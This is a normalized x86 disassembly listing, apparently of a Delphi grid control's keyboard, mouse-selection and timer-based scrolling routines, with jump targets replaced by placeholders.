mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_4668b0
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_467dd8
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_468fe8
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_468cbc
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_468285
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44394c
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_464b1c
mov eax ebx
call sub_464b0c
jmp r-xdata
mov [ esi ] 0x0
sub_4682c4
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4691b0
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_40348c
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_464a8c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4553f0
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_46866f
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f748
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_465bec
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40348c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e384
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_465b90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_4665e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_467258
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4671d0
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_467258
mov eax [ ebp - 0x4 ]
call sub_46928c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412618
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_464b1c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412618
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_466720
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_466720
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetTimer
sub_468690
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_465bec
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465b90
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43fa00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4665e0
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4665e0
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4671d0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412618
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_468ae8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412618
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_468ae8
jmp r-xdata
jmp r-xdata
sub_4687f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_46884c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_468ad7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_40348c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_46928c
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40348c
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_43faa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ade
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_465bec
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4665e0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466720
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412618
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_40348c
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_4687f4
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_4687f4
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_46928c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466720
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412618
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_40348c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_4690f0
mov eax [ ebp - 0x4 ]
call sub_469a40
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_468d80
mov eax [ ebp - 0x4 ]
call sub_469a40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_464e84
mov eax [ ebp - 0x4 ]
call sub_469a40
mov eax [ ebp - 0x4 ]
call sub_46928c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46928c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_464dac
mov eax [ ebp - 0x4 ]
call sub_469a40
sub_468ae8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_43db50
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_466720
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_466fb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_465bec
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_40348c
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_466fb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_465bec
mov eax ebx
call sub_466720
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_468d24
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_466440
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_468eb8
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_468d80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468e1e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_463b3c
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e25
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_467404
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_40348c
sub_468e2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_40348c
mov eax ebx
call sub_466b88
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_463b3c
sub_468e68
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_40348c
mov eax ebx
call sub_466b88
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_463b3c
sub_468eb8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468f40
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468f47
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_466b04
mov eax ebx
call sub_466b88
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x8 ]
call sub_463740
sub_468f50
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468fd8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468fdf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_466b04
mov eax ebx
call sub_466b88
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x8 ]
call sub_463740
sub_468fe8
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_464b1c
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_464b0c
pop ebx
retn
pop ebx
retn
call sub_4642a4
sub_469024
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_466b88
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_467258
mov eax ebx
call sub_464b0c
mov eax ebx
call sub_464b1c
jmp r-xdata
sub_4690b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_466440
mov edx esi
dec edx
mov eax ebx
call sub_468f50
sub_4690f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46918e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_463b3c
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469195
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_467410
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_40348c
sub_4691b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46920f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46936c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_464348
retn
sub_46921c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_460970
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
